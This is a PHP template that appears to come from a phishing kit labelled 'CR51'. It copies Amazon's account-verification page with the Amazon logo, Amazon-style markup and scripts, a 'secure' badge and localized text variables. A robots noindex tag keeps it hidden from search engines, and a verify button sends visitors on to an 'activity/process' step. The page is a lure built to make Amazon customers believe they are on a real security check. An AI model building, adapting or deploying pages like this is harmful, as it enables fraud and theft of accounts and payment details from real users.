<?php
defined("ALLOW") or exit('No direct script access allowed');

$country = trim($_SESSION['countryCode']);
include FCPATH . "CR51/language/lang.php";
?>
<!DOCTYPE html>
<html class="a-transition a-transform a-opacity a-border-image a-border-radius a-box-shadow a-text-stroke a-text-shadow a-touch-scrolling a-transform3d a-gradients a-local-storage a-textarea-placeholder a-input-placeholder a-autofocus a-webworker a-history a-geolocation a-drag-drop a-svg a-canvas a-video a-audio a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember" data-19ax5a9jf="dingo" data-aui-build-date="3.18.5-2018-04-12">

<head>
    <meta charset="utf-8">
    <meta name="robots" content="noindex, nofollow">
    <title dir="ltr"><?php echo $_33 ?></title>
    <link rel="shortcut icon" href="<?= base_url() ?>CR51/Assets/_hayo/images/favicon.ico" />
    <link rel="stylesheet" href="<?= base_url() ?>CR51/Assets/_hayo/css/cr51.styles.css">
    <link rel="stylesheet" href="<?= base_url() ?>CR51/Assets/_hayo/css/cr51.styles2.css">
    <script type="text/javascript" async="" crossorigin="anonymous" src="<?= base_url() ?>CR51/Assets/_hayo/js/cr51.jquery.js"></script>
    <script id="fwcim-script" type="text/javascript" src="<?= base_url() ?>CR51/Assets/_hayo/js/cr51.fwcim.js"></script>
    <style>
        #aa-challenge-whole-page-iframe {
            overflow: hidden;
            opacity: 1.0;
            position: fixed;
            top: 0px;
            bottom: 0px;
            right: 0px;
            border: none;
            margin: 0;
            padding: 0;
            height: 100%;
            width: 100%;
            z-index: 999999;
        }
    </style>
</head>

<body class="a-m-us a-aui_72554-c a-aui_accordion_a11y_role_354025-c a-aui_killswitch_csa_logger_372963-c a-aui_launch_2021_ally_fixes_392482-c a-aui_pci_risk_banner_210084-c a-aui_preload_261698-c a-aui_rel_noreferrer_noopener_309527-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c a-meter-animate">
    <div id="a-page">
        <script type="a-state" data-a-state="{&quot;key&quot;:&quot;a-wlab-states&quot;}">{}</script>
        <div class="a-section a-spacing-none a-padding-medium">
            <div class="a-section a-spacing-none auth-navbar">
                <div class="a-section a-spacing-medium a-text-center">
                    <a class="a-link-nav-icon" tabindex="-1" href="#">
                        <i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>
                    </a>
                </div>
            </div>
        </div>
        <div class="a-section">
            <div class="a-section cvf-widget-container">
                <div class="a-section cvf-page-layout">
                    <div id="cvf-page-content" class="a-section">
                        <div class="a-box">
                            <div class="a-box-inner a-padding-extra-large">
                                <script type="a-state" data-a-state="{&quot;key&quot;:&quot;autoReadAttrs&quot;}">{"isClientDrivenOtpSendingEnabled":false,"arbParam":"aa8315c3-ea95-4623-9ca9-df2efc73bd75","closeMessage":"Enter manually"}</script>
                                <div class="a-row a-spacing-none">
                                    <span class="a-declarative" data-action="a-sheet" data-csa-c-type="widget" data-csa-c-func-deps="aui-da-a-sheet" data-a-sheet="{}"></span>
                                    <div id="codeAutoVerifySheetContent" class="aok-hidden">
                                        <div class="a-container">
                                            <div class="a-row">
                                            </div>
                                        </div>
                                    </div>

                                    <div class="a-section a-spacing-mini a-spacing-top-micro a-text-center"><img src="<?= base_url() ?>CR51/Assets/_hayo/images/secure.png" height="20%" width="20%"></div>
                                    <div class="a-row a-spacing-small">
                                        <div class="a-row a-spacing-small">
                                            <h1><?php echo $_34 ?></h1>
                                        </div>
                                        <div class="a-row a-spacing-none">
                                            <span><?php echo $_35 ?></span>
                                        </div>
                                        <div class="a-row a-spacing-top-base">
                                            <div class="a-row a-expander-container a-expander-inline-container">
                                                <a data-csa-c-func-deps="aui-da-a-expander-toggle" data-csa-c-type="widget" data-csa-interaction-events="click" aria-expanded="false" role="button" href="javascript:void(0)" data-action="a-expander-toggle" class="a-expander-header a-declarative a-expander-inline-header a-link-expander" data-a-expander-toggle="{&quot;allowLinkDefault&quot;:true, &quot;expand_prompt&quot;:&quot;&quot;, &quot;collapse_prompt&quot;:&quot;&quot;}">
                                                    <i class="a-icon a-icon-expand"></i>
                                                    <span class="a-expander-prompt">
                                                        <span class="a-size-base"><b><?php echo $_36 ?></b> <?php echo $_37 ?></span>
                                                    </span>
                                                </a>
                                                <div aria-expanded="false" class="a-expander-content a-expander-inline-content a-expander-inner" style="overflow: hidden; display: none;">
                                                    <div class="a-row a-spacing-small">
                                                        <span class="a-size-small"><?php echo $_38 ?></span>
                                                    </div>
                                                    <div class="a-row a-spacing-small">
                                                        <span class="a-size-small"><b><?php echo $_39 ?></b> <?php echo $_40 ?></span>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="a-row a-spacing-top-base">
                                            <div class="a-row a-expander-container a-expander-inline-container">
                                                <a data-csa-c-func-deps="aui-da-a-expander-toggle" data-csa-c-type="widget" data-csa-interaction-events="click" aria-expanded="false" role="button" href="javascript:void(0)" data-action="a-expander-toggle" class="a-expander-header a-declarative a-expander-inline-header a-link-expander" data-a-expander-toggle="{&quot;allowLinkDefault&quot;:true, &quot;expand_prompt&quot;:&quot;&quot;, &quot;collapse_prompt&quot;:&quot;&quot;}">
                                                    <i class="a-icon a-icon-expand"></i>
                                                    <span class="a-expander-prompt">
                                                        <span class="a-size-base"><b><?php echo $_41 ?></b> <?php echo $_42 ?></span>
                                                    </span>
                                                </a>
                                                <div aria-expanded="false" class="a-expander-content a-expander-inline-content a-expander-inner" style="overflow: hidden; display: none;">
                                                    <div class="a-row a-spacing-small">
                                                        <span class="a-size-small"><?php echo $_43 ?></span>
                                                    </div>
                                                    <div class="a-row a-spacing-small">
                                                        <span class="a-size-small"><b><?php echo $_39 ?></b> <?php echo $_44 ?></span>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="a-row a-spacing-small">
                                        <span id="cvf-submit-otp-button" class="a-button a-button-span12 a-button-primary cvf-widget-btn cvf-widget-btn-verify">
                                            <span class="a-button-inner">
                                                <a href="<?= base_url() ?>activity/process" class="a-button-text" role="button"><?php echo $_7 ?></a>
                                            </span>
                                        </span>
                                    </div>
                                </div>
                                <script>
                                    P.when('A', 'ready').execute(function(A) {
                                        var $ = A.$;
                                        $('.cvf-widget-link-resend').click(function() {
                                            $('.cvf-widget-form-resend').submit();
                                        });
                                    });
                                </script>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style>
            .auth-footer-separator {
                display: inline-block;
                width: 20px;
            }
        </style>
        <div class="a-divider a-divider-section">
            <div class="a-divider-inner"></div>
        </div>
        <div id="footer" class="a-section">
            <div class="a-section a-spacing-small a-text-center">
                <span class="auth-footer-separator"></span>
                <a class="a-link-normal" target="_blank" rel="noopener" href="#"> <?php echo $_21 ?> </a>
                <span class="auth-footer-separator"></span>
                <a class="a-link-normal" target="_blank" rel="noopener" href="#"> <?php echo $_22 ?> </a>
                <span class="auth-footer-separator"></span>
                <a class="a-link-normal" target="_blank" rel="noopener" href="#"> <?php echo $_23 ?> </a>
                <span class="auth-footer-separator"></span>
            </div>
            <div class="a-section a-spacing-none a-text-center">
                <span class="a-size-mini a-color-secondary"> <?php echo $_24 ?> </span>
            </div>
        </div>
    </div>
    <div class="fwcim-container"></div>
    <div id="a-popover-root" style="z-index:-1;position:absolute;"></div>
</body>

</html>